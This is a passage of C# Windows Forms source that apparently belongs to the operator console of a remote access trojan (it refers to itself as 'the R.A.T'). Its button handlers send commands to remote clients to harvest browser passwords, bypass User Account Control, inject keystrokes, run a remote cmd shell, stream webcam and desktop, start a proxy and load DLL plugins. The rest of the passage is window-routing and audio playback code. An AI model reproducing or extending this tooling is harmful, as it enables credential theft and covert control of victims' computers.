        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button31_Click(object sender, EventArgs e)
        {
            SendToTarget("getpw"); //Get browser passwords on the remote client
        }

        /// <summary>
        /// Set the frame rate on a remote desktop session
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void trackBar1_Scroll(object sender, EventArgs e)
        {
            int value = trackBar1.Value; //Get the value of the trackBar
            lblQualityShow.Text = value.ToString(); //Update the UI

            //Decide quality and send it to the client
            if (value < 25)
            {
                lblQualityShow.Text += "(low)";
                SendToTarget("fpslow");
            }
            else if (value >= 75 && value <= 85)
            {
                lblQualityShow.Text += "(best)";
                SendToTarget("fpsbest");
            }
            else if (value >= 85)
            {
                lblQualityShow.Text += "(high)";
                SendToTarget("fpshigh");
            }
            else if (value >= 25)
            {
                lblQualityShow.Text += "(mid)";
                SendToTarget("fpsmid");
            }


            ActiveControl = pictureBox1; //Send focus to the pictureBox
        }

        /// <summary>
        /// Activate remote keyboard
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void pictureBox1_Click(object sender, EventArgs e)
        {
            txtBControlKeyboard.Focus(); //Focus the invisible textBox
        }

        /// <summary>
        /// Send keys to the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void txtBControlKeyboard_KeyDown(object sender, KeyEventArgs e)
        {
            if (rkeyboard == 1) //If we can control the keyboard
            {
                string keysToSend = ""; //Declare the keys to send

                //Handle the modifier keys
                if (e.Shift)
                    keysToSend += "+";
                if (e.Alt)
                    keysToSend += "%";
                if (e.Control)
                    keysToSend += "^";

                if (Console.CapsLock == true) //If CapsLock is enabled
                {
                    if (e.KeyValue >= 65 && e.KeyValue <= 90) //If the keys fall in this range
                    {
                        keysToSend += e.KeyCode.ToString().ToLower(); //Convert them to lower case
                    }
                }

                if (Console.CapsLock == false) //If CapsLock is disabled
                {
                    if (e.KeyValue >= 65 && e.KeyValue <= 90) //If the keys fall in this range, convert them to upper case
                    {
                        keysToSend += e.KeyCode.ToString().ToUpper();
                    }
                }

                //Handle Special Characters

                if (e.KeyCode.ToString().Equals("Back"))
                    keysToSend += ("{BS}");
                else if (e.KeyCode.ToString().Equals("Pause"))
                    keysToSend += ("{BREAK}");
                else if (e.KeyCode.ToString().Equals("Capital"))
                    keysToSend += ("{CAPSLOCK}");
                else if (e.KeyCode.ToString().Equals("Space"))
                    keysToSend += (" ");
                else if (e.KeyCode.ToString().Equals("Home"))
                    keysToSend += ("{HOME}");
                else if (e.KeyCode.ToString().Equals("Return"))
                    keysToSend += ("{ENTER}");
                else if (e.KeyCode.ToString().Equals("End"))
                    keysToSend += ("{END}");
                else if (e.KeyCode.ToString().Equals("Tab"))
                    keysToSend += ("{TAB}");
                else if (e.KeyCode.ToString().Equals("Escape"))
                    keysToSend += ("{ESC}");
                else if (e.KeyCode.ToString().Equals("Insert"))
                    keysToSend += ("{INS}");
                else if (e.KeyCode.ToString().Equals("Up"))
                    keysToSend += ("{UP}");
                else if (e.KeyCode.ToString().Equals("Down"))
                    keysToSend += ("{DOWN}");
                else if (e.KeyCode.ToString().Equals("Left"))
                    keysToSend += ("{LEFT}");
                else if (e.KeyCode.ToString().Equals("Right"))
                    keysToSend += ("{RIGHT}");
                else if (e.KeyCode.ToString().Equals("PageUp"))
                    keysToSend += ("{PGUP}");
                else if (e.KeyCode.ToString().Equals("Next"))
                    keysToSend += ("{PGDN}");
                else if (e.KeyCode.ToString().Equals("Tab"))
                    keysToSend += ("{TAB}");
                else if (e.KeyCode.ToString().Equals("D1"))
                    keysToSend += "1";
                else if (e.KeyCode.ToString().Equals("D2"))
                    keysToSend += "2";
                else if (e.KeyCode.ToString().Equals("D3"))
                    keysToSend += "3";
                else if (e.KeyCode.ToString().Equals("D4"))
                    keysToSend += "4";
                else if (e.KeyCode.ToString().Equals("D5"))
                    keysToSend += "5";
                else if (e.KeyCode.ToString().Equals("D6"))
                    keysToSend += "6";
                else if (e.KeyCode.ToString().Equals("D7"))
                    keysToSend += "7";
                else if (e.KeyCode.ToString().Equals("D8"))
                    keysToSend += "8";
                else if (e.KeyCode.ToString().Equals("D9"))
                    keysToSend += "9";
                else if (e.KeyCode.ToString().Equals("D0"))
                    keysToSend += "0";
                else if (e.KeyCode.ToString().Equals("F1"))
                    keysToSend += "{F1}";
                else if (e.KeyCode.ToString().Equals("F2"))
                    keysToSend += "{F2}";
                else if (e.KeyCode.ToString().Equals("F3"))
                    keysToSend += "{F3}";
                else if (e.KeyCode.ToString().Equals("F4"))
                    keysToSend += "{F4}";
                else if (e.KeyCode.ToString().Equals("F5"))
                    keysToSend += "{F5}";
                else if (e.KeyCode.ToString().Equals("F6"))
                    keysToSend += "{F6}";
                else if (e.KeyCode.ToString().Equals("F7"))
                    keysToSend += "{F7}";
                else if (e.KeyCode.ToString().Equals("F8"))
                    keysToSend += "{F8}";
                else if (e.KeyCode.ToString().Equals("F9"))
                    keysToSend += "{F9}";
                else if (e.KeyCode.ToString().Equals("F10"))
                    keysToSend += "{F10}";
                else if (e.KeyCode.ToString().Equals("F11"))
                    keysToSend += "{F11}";
                else if (e.KeyCode.ToString().Equals("F12"))
                    keysToSend += "{F12}";
                else if (e.KeyValue == 186)
                    keysToSend += "{;}";
                else if (e.KeyValue == 222)
                    keysToSend += "'";
                else if (e.KeyValue == 191)
                    keysToSend += "/";
                else if (e.KeyValue == 190)
                    keysToSend += ".";
                else if (e.KeyValue == 188)
                    keysToSend += ",";
                else if (e.KeyValue == 219)
                    keysToSend += "{[}";
                else if (e.KeyValue == 221)
                    keysToSend += "{]}";
                else if (e.KeyValue == 220)
                    keysToSend += "\\";
                else if (e.KeyValue == 187)
                    keysToSend += "{=}";
                else if (e.KeyValue == 189)
                    keysToSend += "{-}";
                else if (e.KeyValue == 233)
                    keysToSend += "é";
                else if (e.KeyValue == 225)
                    keysToSend += "á";
                else if (e.KeyValue == 369)
                    keysToSend += "ű";
                else if (e.KeyValue == 337)
                    keysToSend += "ő";
                else if (e.KeyValue == 250)
                    keysToSend += "ú";
                else if (e.KeyValue == 246)
                    keysToSend += "ö";
                else if (e.KeyValue == 252)
                    keysToSend += "ü";
                else if (e.KeyValue == 243)
                    keysToSend += "ó";

                SendToTarget($"rtype-{keysToSend}");

            }
            txtBControlKeyboard.Clear(); //Clear the control
        }

        /// <summary>
        /// Start a task manager on the remote system
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void btnStartTaskManager_Click(object sender, EventArgs e)
        {
            SendToTarget("tskmgr"); //Send the command to the client
        }

        /// <summary>
        /// Get the screen count of the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void btnCountScreens_Click(object sender, EventArgs e)
        {
            cmboChooseScreen.Items.Clear(); //Clear the current items
            SendToTarget("countScreens"); //Send the command to the client
        }

        /// <summary>
        /// Handles when a client is selected
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            //Declare info vars
            string clientType = "";

            if (listView1.SelectedItems.Count == 0) //If no item is selected
            {
                label2.Text = "Client Info"; //Update the UI
                return; //Return
            }
            string strClient = listView1.SelectedItems[0].SubItems[0].Text; //Get the selected client's ID
            strClient = strClient.Replace("Client ", string.Empty); //Remove the client part
            int clientID = int.Parse(strClient); //Parse the ID to an integer
            if (lcm != null) //If linux client manager is enabled
            {
                if (lcm.IsLinuxClient(clientID)) clientType = "Linux Client"; //Is it's a linux client update the UI
                else clientType = "Windows Client"; //It's a windows client, update the UI
            }

            //Write data to label2 (Client Information)

            label2.Text = $"Client Type: {clientType}";
        }

        /// <summary>
        /// Bypass the UAC on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button33_Click(object sender, EventArgs e)
        {
            SendToTarget("uacbypass"); //Send the command to the client
        }

        /// <summary>
        /// Start the proxyServer on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button34_Click(object sender, EventArgs e)
        {
            const string cmd = "startipc§tut_client_proxy"; //Construct the command
            RemotePipe rp = new RemotePipe("tut_client_proxy", this); //Create a new remote pipe
            SendToTarget(cmd); //Send the command oto the client
            sCore.RAT.ExternalApps.AddIPCConnection(hostToken, new KeyValuePair<string, RichTextBox>("tut_client_proxy", rp.outputBox)); //Broadcast the IPC connection to the plugins
            rp.Show(); //Start the remote pipe
            rPipeList.Add(rp); //Add the pipe to the list
        }

        /// <summary>
        /// Handles when a plugin is selected
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem != null) //If an item is selected
            {
                string plugin = listBox1.SelectedItem.ToString(); //Get the name of the plugin
                IPluginMain pInfo = sh.GetPluginInfo(plugin); //Get the plugin information
                label29.Text = $"Name: {pInfo.ScriptName}"; //Set the name
                label30.Text = $"Version: {pInfo.Scriptversion}"; //Set the version
                label31.Text = $"Author: {pInfo.AuthorName}" + pInfo.AuthorName; //Set the author's name
                label32.Text = $"Description: {pInfo.ScriptDescription}"; //Set the description
                comboBox6.Items.Clear(); //Clear the permission box

                foreach (Permissions p in pInfo.ScriptPermissions) //Go through the permissions
                {
                    comboBox6.Items.Add(p.ToString()); //Add the permission to the list
                }

                if (comboBox6.Items.Count > 0) comboBox6.SelectedIndex = 0; //Select the first item is it's not empty
            }
            else //No item selected
            {
                label29.Text = "Name: "; //Set the name
                label30.Text = "Version: "; //Set the version
                label31.Text = "Author: "; //Set the author
                label33.Text = "Description: "; //Set the description
                comboBox6.Items.Clear(); //Clear the permission list
            }
        }

        /// <summary>
        /// Execute a plugin
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button37_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem != null) //If a plugin is seleted
            {
                //sh.ExecuteScript(listBox1.SelectedItem.ToString());
                sh.ExecuteDll(listBox1.SelectedItem.ToString()); //Execute the plugin
            }
            else //No plugin selected
            {
                MessageBox.Show(this, "Script can't be executed", "No script selected"); //Notify the user
            }
        }

        /// <summary>
        /// Refresh the plugin list
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button38_Click(object sender, EventArgs e)
        {
            // TODO: i'm sure we can somehow reload the list without interfering with running plugins
            if (sh.runningPlugins.Count > 0)
            {
                MessageBox.Show(this, "There are running plugins, you can't currently refresh the plugin list", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            listBox1.Items.Clear(); //Clear the plugin list
            sh.LoadDllFiles(); //Reload the plugin files

            //Update the information UI parts
            label29.Text = "Name: ";
            label30.Text = "Version: ";
            label32.Text = "Description: ";
            label31.Text = "Author: ";
            comboBox6.Items.Clear();
            comboBox6.Text = "";
        }

        /// <summary>
        /// Remove a plugin from the R.A.T
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button36_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem != null) //If an item is seleted
            {
                // TODO: Should implement this to ScriptHost itself!
                string scriptName = listBox1.SelectedItem.ToString(); //Get the plugin's file name
                //if (sh.IsPluginRunning(scriptName)) //Stop plugin
                File.Delete(Application.StartupPath + "\\scripts\\" + scriptName); //Delete the plugin
                button38_Click(null, null); //Click the refresh button
            }
            else //No plugin selected
            {
                MessageBox.Show(this, "No plugin selected", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
            }
        }

        /// <summary>
        /// Import a plugin file
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button35_Click(object sender, EventArgs e)
        {
            //Should implement this in ScriptHost
            OpenFileDialog ofd = new OpenFileDialog
            {
                Title = "Please Select A Valid Dll Pluing File", //Set the title of the dialog
                DefaultExt = "Plugin Files (*.dll)|*.dll" //Set the file extension filter to dll files
            }; //Display a file chooser dialog
            if (ofd.ShowDialog() == DialogResult.OK) //If the user selected the file
            {
                if (File.Exists(ofd.FileName)) //If the selected file exists
                {
                    File.Copy(ofd.FileName, Application.StartupPath + "\\scripts\\" + new FileInfo(ofd.FileName).Name); //Copy the file to the plugin folder
                    button38_Click(null, null); //Click the button
                }
                else //Invalid file selected
                {
                    MessageBox.Show(this, "Selected File doesn't exist", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
                }
            }
        }

        /// <summary>
        /// Start UAC bypass auto download on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button20_Click(object sender, EventArgs e)
        {
#if EnableAutoLoad
            SendToTarget("uacload"); //Send the command to the client
            progressBar1.Show(); //Show the progressbar
            label36.Show(); //Show the status label
            label36.Text = "0%"; //Set the label to 0%
#endif
        }

        /// <summary>
        /// Probe system startup methods
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button23_Click(object sender, EventArgs e)
        {
            if (comboBox7.SelectedItem == null) //If a no method selected
            {
                Msgbox("Error!", "No probing method selected!\r\nPlease select one!", MessageBoxButtons.OK, MessageBoxIcon.Error); //Notify the user
                return; //Return
            }

            SendToTarget($"sprobe§{comboBox7.SelectedItem}"); //Send the command to the client
        }

        /// <summary>
        /// Stop a plugin from running
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button39_Click(object sender, EventArgs e)
        {
            if (listBox1.SelectedItem == null) //Check if nothing is selected
            {
                MessageBox.Show(this, "Please select a plugin to stop", "Stop Plugin", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                return; //Return
            }

            string plugin = listBox1.SelectedItem.ToString(); //Get the name of the plugin
            if (sh.IsPluginRunning(plugin)) //Check if the plugin is running
            {
                sh.StopSignalPlugin(sh.ifaceList[plugin]); //Send stop signal to the plugin
                MessageBox.Show(this, "Stop signal sent to plugin, it will finish up and close it's threads... This may take a while", "Plugin Stop", MessageBoxButtons.OK, MessageBoxIcon.Information); //Notify the user
            }
        }

#endregion
    }

#region Outer Classes

    /// <summary>
    /// Audio playback class
    /// </summary>
    public class AudioStream
    {
        /// <summary>
        /// Audio Stream provider
        /// </summary>
        NAudio.Wave.BufferedWaveProvider provider;
        /// <summary>
        /// Audio stream player
        /// </summary>
        NAudio.Wave.WaveOut waveOut;

        /// <summary>
        /// Init audio stream playing
        /// </summary>
        public void Init()
        {
            provider = new NAudio.Wave.BufferedWaveProvider(new NAudio.Wave.WaveFormat()); //Setup the provider
            waveOut = new NAudio.Wave.WaveOut(); //Setup the player
            waveOut.Init(provider); //Bind the player to the provider
            waveOut.Play(); //Start playing incoming data with the player
        }

        /// <summary>
        /// Send audio to the playback device
        /// </summary>
        /// <param name="recv">The audio buffer to play</param>
        public void BufferPlay(byte[] recv)
        {
            provider.AddSamples(recv, 0, recv.Length); //Feed the buffer to the provider
            recv = null; //Remove references to the buffer
        }

        /// <summary>
        /// Release audio playing object
        /// </summary>
        public void Destroy()
        {
            waveOut.Stop(); //Stop playing the audio
            provider.ClearBuffer(); //Clear the audio buffer
            waveOut.Dispose(); //Dispose the player
            waveOut = null; //Remove references to the player
            provider = null; //Remove references to the provider
        }
    }

    /// <summary>
    /// Provides functionality to use tabpages as small forms
    /// </summary>
    public class RouteWindow
    {
        /// <summary>
        /// The page we will route
        /// </summary>
        public TabPage page;
        /// <summary>
        /// A list of control names disabled to setvalue (this is used to prevent looping setvalue directives)
        /// </summary>
        private List<String> disableWrite = new List<String>();
        /// <summary>
        /// Reference to the created form
        /// </summary>
        private Form currentRoute = new Form();
        //private TabPage orgBackup = new TabPage();

        /// <summary>
        /// Copy tab page to a form
        /// </summary>
        public void RoutePage()
        {
            if (page == null) return; //If no page routed return

            Control.ControlCollection controls = page.Controls; //Get the page controls
            Form route = new Form
            {
                Size = page.Parent.Size, //Get the size of the form
                Text = "RouteWindow[" + (Form1.routeWindow.Count + 1).ToString() + "] " + page.Text, //Set the form title
                WindowState = FormWindowState.Normal, //Set the form window state
                FormBorderStyle = FormBorderStyle.FixedToolWindow, //Set the form's border style
                BackColor = SystemColors.Window //Set the form's background color
            }; //Create the new routed form
            String assignContextMenu = "";
            ContextMenuStrip cloneCMS = new ContextMenuStrip();

            foreach (Control c in controls) //Loop through the controls
            {
                String name = c.Name; //Get the name of the control
                String type = GetControlType(name); //Get the type of the control
                Control add;
                if (type == "") continue; //If invalid type found, then skip it
                switch (type) //Switch type
                {
                    case "label": //If control is a label

                        Label l = new Label(); //Create a new label
                        Label reference = (Label)c; //Cast the original label
                        l.Location = c.Location; //Copy the location
                        l.Font = c.Font; //Copy the font settings
                        l.BackColor = c.BackColor; //Copy the back color
                        l.Text = c.Text; //Copy the text
                        l.Name = c.Name; //Copy the name
                        l.ForeColor = c.ForeColor; //Copy the text color
                        l.AutoSize = reference.AutoSize; //Copy the autoSize property
                        add = l; //Set the control to add

                        route.Controls.Add(l); //Add the label to the form

                        break; //Break the switch

                    case "button": //If control is a button

                        Button b = new Button(); //Create a new button
                        Button bref = c as Button; //Cast the original button

                        b.Text = bref.Text; //Set the text
                        b.Location = bref.Location; //Set the location
                        b.Size = bref.Size; //Set the size
                        b.AutoSize = bref.AutoSize; //Set the autoSize
                        b.BackColor = bref.BackColor; //Set the background color
                        b.ForeColor = bref.ForeColor; //Set the text color
                        b.UseVisualStyleBackColor = bref.UseVisualStyleBackColor; //Set the visual style background color property
                        b.Click += new EventHandler(OnClick); //Add the click event handler
                        b.Name = bref.Name; //Set the name

                        route.Controls.Add(b); //Add the button to the form

                        break; //Break the switch

                    case "comboBox": //Control is a combobox

                        ComboBox cb = new ComboBox(); //Create a new combobox
                        ComboBox cref = (ComboBox)c; //Cast the original combobox

                        cb.Text = cref.Text; //Set the text
                        cb.Name = cref.Name; //Set the name
                        cb.Location = cref.Location; //Set the location
                        cb.Size = cref.Size; //Set the size
                        cb.SelectedItem = cref.SelectedItem; //Set the selected item
                        foreach (Object item in cref.Items) //Copy every item
                        {
                            cb.Items.Add(item); //Add the item to the new combobox
                        }
                        cb.ForeColor = cref.ForeColor; //Set the text color
                        cb.BackColor = cref.BackColor; //Set the background color
                        cb.SelectedIndex = cref.SelectedIndex; //Set the selected item's index
                        cb.Font = cref.Font; //Set the font settings
                        cb.SelectedValueChanged += new EventHandler(OnItemChange); //Add a value changed event handler

                        route.Controls.Add(cb); //Add the combobox to the form

                        break; //Break the switch

                    case "richTextBox": //If it's a richTextBox control

                        RichTextBox rtb = new RichTextBox(); //Create a new richTextBox
                        RichTextBox rref = (RichTextBox)c; //Cast the original richTextBox

                        rtb.Name = rref.Name; //Set the name
                        rtb.Text = rref.Text; //Set the text
                        rtb.BackColor = rref.BackColor; //Set the background color
                        rtb.ForeColor = rref.ForeColor; //Set the text color
                        rtb.Location = rref.Location; //Set the location
                        rtb.Size = rref.Size; //Set the size
                        rtb.WordWrap = rref.WordWrap; //Set the word wrap property
                        rtb.Font = rref.Font; //Set the font settings
                        rtb.TextChanged += new EventHandler(OnTextChange); //Add a text changed event handler

                        route.Controls.Add(rtb); //Add the richTextBox to the form

                        break; //Break the swithc

                    case "textBox": //Control is a textBox

                        TextBox t = new TextBox(); //Create a new textBox
                        TextBox tref = (TextBox)c; //Csat the original textBox

                        t.Name = tref.Name; //Set the name
                        t.Text = tref.Text; //Set the text
                        t.BackColor = tref.BackColor; //Set the background color
                        t.ForeColor = tref.ForeColor; //Set the textColor
                        t.Location = tref.Location; //Set the location
                        t.Size = tref.Size; //Set the size
                        t.TextChanged += new EventHandler(OnTextChange); //Add a text changed event handler
                        t.KeyDown += new KeyEventHandler(OnKeyDown); //Add a key down event handler
                        t.Font = tref.Font; //Set the font settings
                        t.UseSystemPasswordChar = tref.UseSystemPasswordChar; //Set the use of password character
                        t.PasswordChar = tref.PasswordChar; //Set the password character
                        if (tref.Tag != null) t.Tag = "route" + (Form1.routeWindow.Count + 1).ToString() + ".register." + tref.Tag.ToString(); //Set the tag

                        route.Controls.Add(t); //Add the textBox to the form

                        break; //Break the switch

                    case "listView": //Control is a listView

                        ListView lv = new ListView(); //Create a new listView
                        ListView lref = (ListView)c; //Cast the original listView

                        lv.Name = lref.Name; //Set the name
                        lv.View = lref.View; //Set the view
                        lv.BackColor = lref.BackColor; //Set the background color
                        lv.ForeColor = lref.ForeColor; //Set the text color
                        lv.Location = lref.Location; //Set the location
                        lv.Size = lref.Size; //Set the size
                        lv.FullRowSelect = lref.FullRowSelect; //Set the full row selected property
                        lv.GridLines = lref.GridLines; //Set the grid lines property
                        if (lref.ContextMenuStrip != null) //If the listView has a context menu strip
                        {
                            assignContextMenu = lv.Name; //Set the assign context menu name
                            cloneCMS = lref.ContextMenuStrip; //Set the context menu to copy
                        }

                        foreach (ColumnHeader ch in lref.Columns) //Go through the columns
                        {
                            ColumnHeader header = new ColumnHeader
                            {
                                DisplayIndex = ch.DisplayIndex, //Set the display index
                                Name = ch.Name, //Set the name
                                Text = ch.Text, //Set the text
                                Width = ch.Width //Set the width
                            }; //Create a new column header

                            lv.Columns.Add(header); //Add the column to the new listView
                        }
                        foreach (ListViewItem i in lref.Items) //Go through the items
                        {
                            ListViewItem lvi = new ListViewItem
                            {
                                BackColor = i.BackColor, //Set the background color
                                Focused = i.Focused, //Set the focused state
                                Font = i.Font, //Set the font settings
                                ForeColor = i.ForeColor, //Set the text color
                                Name = i.Name, //Set the name
                                Text = i.Text, //Set the text
                                Selected = i.Selected //Set if the item is selected
                            }; //Create a new listView item
                            foreach (ListViewItem.ListViewSubItem si in i.SubItems) //Go through the subitems
                            {
                                ListViewItem.ListViewSubItem sitem = new ListViewItem.ListViewSubItem
                                {
                                    BackColor = si.BackColor, //Set the background color
                                    Font = si.Font, //Set the font settings
                                    ForeColor = si.ForeColor, //Set the text color
                                    Name = si.Name, //Set the name
                                    Text = si.Text //Set the text
                                }; //Create a new subitem
                                lvi.SubItems.Add(sitem); //Add the subitem to the current item
                            }
                            lv.Items.Add(lvi); //Add the current item to the listView
                        }

                        lv.SelectedIndexChanged += new EventHandler(OnIndexChange); //Add the selected index changed event handler
                        lv.Font = lref.Font; //Set the font settings

                        route.Controls.Add(lv); //Add the listView to the form

                        break; //Break the switch

                    case "checkBox": //Control is a checkBox

                        CheckBox cx = new CheckBox(); //Create a new checkBox
                        CheckBox xref = (CheckBox)c; //Cast the original checkBox

                        cx.Text = xref.Text; //Set the text
                        cx.Name = xref.Name; //Set the name
                        cx.Checked = xref.Checked; //Set the checked state
                        cx.ForeColor = xref.ForeColor; //Set the text color
                        cx.BackColor = xref.BackColor; //Set the background color
                        cx.Location = xref.Location; //Set the location
                        cx.AutoSize = xref.AutoSize; //Set the autoSize property
                        cx.Size = xref.Size; //Set the size
                        cx.Font = xref.Font; //Set the font settings
                        cx.CheckedChanged += new EventHandler(OnCheck); //Add a checked changed event handler

                        route.Controls.Add(cx); //Add the checkBox to the form

                        break; //Break the switch

                    case "pictureBox": //Control is a pictureBox

                        PictureBox pb = new PictureBox(); //Create a new pictureBox
                        PictureBox pref = (PictureBox)c; //Cast the original pictureBox
                        pb.Name = pref.Name; //Set the name
                        pb.Size = pref.Size; //Set the size
                        pb.SizeMode = pref.SizeMode; //Set the image's size mode
                        pb.Image = pref.Image; //Set the image
                        pb.Location = pref.Location; //Set the location
                        pb.BackColor = pref.BackColor; //Set the background color
                        pb.Tag = "route" + (Form1.routeWindow.Count + 1).ToString() + ".register." + pref.Tag.ToString(); //Set the tag
                        if (pref.Tag.ToString() == "rdesktop") Form1.rdRouteUpdate = pb.Tag.ToString(); //Set the remoteDesktop update tag
                        if (pref.Tag.ToString() == "wcstream") Form1.wcRouteUpdate = pb.Tag.ToString(); //Set the web cam update tag

                        route.Controls.Add(pb); //Add the picture box to the form

                        break; //Break the switch
                }
            }

            //Controls are added at this Point

            route.Show(); //Show the newly created form
            route.FormClosing += new FormClosingEventHandler(OnRouteDestroy); //Assign a closing event handler
            Form1.routeWindow.Add(route); //Add the window to the list
            if (assignContextMenu != "") //If we need to assign a context menu
            {
                Control acms = route.Controls.Find(assignContextMenu, false)[0]; //Find the parent listView of the contextMenu
                ContextMenuStrip copyCMS = new ContextMenuStrip
                {
                    AutoSize = cloneCMS.AutoSize, //Set the autoSize property
                    Font = cloneCMS.Font, //Set the font settings
                    BackColor = cloneCMS.BackColor, //Set the backgroung color
                    ForeColor = cloneCMS.ForeColor, //Set the text color
                    Name = cloneCMS.Name, //Set the name
                    Size = cloneCMS.Size, //Set the size
                    Text = cloneCMS.Text //Set the text
                }; //Create a new context menu strip

                foreach (ToolStripItem i in cloneCMS.Items) //Go through the toolStripItems
                {
                    copyCMS.Items.Add(i.Text, i.Image, OnClick); //Add the items to the new CMS
                }
                int track = 0; //Declare index variable
                foreach (ToolStripItem i in copyCMS.Items) //Go through the items
                {
                    i.BackColor = SystemColors.Window; //Set the background color
                    i.Name = cloneCMS.Items[track].Name; //Set the name
                    track++; //Increment the index;
                }

                //route.Controls.Add(copyCMS);
                acms.ContextMenuStrip = copyCMS; //Set the CMS of the listView
            }

            Timer update = new Timer
            {
                Interval = 100 //Set the frequency to 100 ms
            }; //Create a new timer object
            update.Tick += new EventHandler(UpdateUI); //Set the tick event handler
            currentRoute = route; //Set a self reference
            update.Start(); //Start the timer
        }

        /// <summary>
        /// TextBox keydown event handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return && Form1.IsCmdStarted) //If eneter is pressed and remote cmd is started
            {
                TextBox me = sender as TextBox; //Get the caller of the event
                if (me.Tag.ToString().Split('.')[2] == "rcmd") //if the tag says to to update the remote cmd
                {
                    String command = "cmd§" + me.Text; //Construct the command
                    me.Text = ""; //Clear the text
                    Form1 f = new Form1(); //Create a new instance of the form
                    f.SendToTarget(command); //Send the command
                }
            }
            else if (e.KeyCode == Keys.Return && !Form1.IsCmdStarted) //If eneter is pressed and cmd isn't started
            {
                //Notify the user
                MessageBox.Show(Form1.me, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        /// <summary>
        /// Form closing event handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void OnRouteDestroy(object sender, FormClosingEventArgs e)
        {
            Form dieRoute = (Form)sender; //Get our form
            String dieRouteID = dieRoute.Text.Split('[')[1].Substring(0, 1); //Get the route ID
            String rdUpdateID = Form1.rdRouteUpdate.Split('.')[0].Replace("route", ""); //Get the remote desktop route ID
            String wcUpdateID = Form1.wcRouteUpdate.Split('.')[0].Replace("route", ""); //Get the webcam stream route ID
            if (dieRouteID == rdUpdateID) //If our form is the remote desktop route
            {
                Form1.rdRouteUpdate = "route0.none"; //Reset the remote desktop route window
            }
            if (dieRouteID == wcUpdateID) //If our form is the web cam stream route
            {
                Form1.wcRouteUpdate = "route0.none"; //Reset the web cam strean route window
            }
            Form1.routeWindow.Remove(dieRoute); //Remove our window from the list
            int exitPoint = int.Parse(dieRouteID) - 1; //Get the index of our removed window

            for (int i = exitPoint; i < Form1.routeWindow.Count; i++) //Go through every window after our removed window
            {
                int currentRouteID = int.Parse(Form1.routeWindow[i].Text.Split('[')[1].Substring(0, 1)); //Get the window's route ID
                String textStart = Form1.routeWindow[i].Text.Split('[')[0]; //Get the start of the text
                String textEnd = Form1.routeWindow[i].Text.Split('[')[1]; //Get the end of the text
                textEnd = textEnd.Substring(1); //Remove the first char of the ending text
                textEnd = "[" + (currentRouteID - 1).ToString() + textEnd; //Decrement the route ID by 1, because our form is removed
                Form1.routeWindow[i].Text = textStart + textEnd; //Set the new title text for the window
            }

            //Die :(
        }

        /// <summary>
        /// Selected Item Changed Event Handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void OnItemChange(object sender, EventArgs e)
        {
            Control ctl = sender as Control; //Get the caller control

            if (ctl.Name.StartsWith("comboBox")) //If the control is a combobox
            {
                ComboBox cb = ctl as ComboBox; //Cast the control to a combobox
                String slitem = cb.SelectedItem.ToString(); //Get the selected item of the combobox
                Form1.setvalue.Add(cb.Name + "§" + slitem); //Add the selected item to the setvalue instructions
            }
        }

        /// <summary>
        /// Get if a set command of a control is alreaydy in progress
        /// </summary>
        /// <param name="name">The name of the control to check</param>
        /// <returns>True if the control has a setvalue directive, otherwise false</returns>
        private bool GetignoreState(String name)
        {
            bool isIgnore = false; //Declare the ignore flag

            foreach (String pending in Form1.setvalue) //Go through the instructions
            {
                if (pending.Split('§')[0] == name) //If the names match
                {
                    isIgnore = true; //Set the ignore flag
                    break; //Break the loop
                }
            }

            return isIgnore; //Return the ignore flag
        }

        /// <summary>
        /// Checkbox Checked Changed Event Handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void OnCheck(object sender, EventArgs e)
        {
            CheckBox cb = sender as CheckBox; //Cast the caller to a checkBox
            bool check = cb.Checked; //Get the checked stated
            String name = cb.Name; //Get the caller's name
            Form1.setvalue.Add(name + "§" + check.ToString().ToLower()); //Update the setvalue instructions
        }

        /// <summary>
        /// Text change event handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void OnTextChange(object sender, EventArgs e)
        {
            Control t = sender as Control; //Cast the caller to a control
            String name = t.Name; //Get the name of the caller
            String text = t.Text; //Get the text of the caller
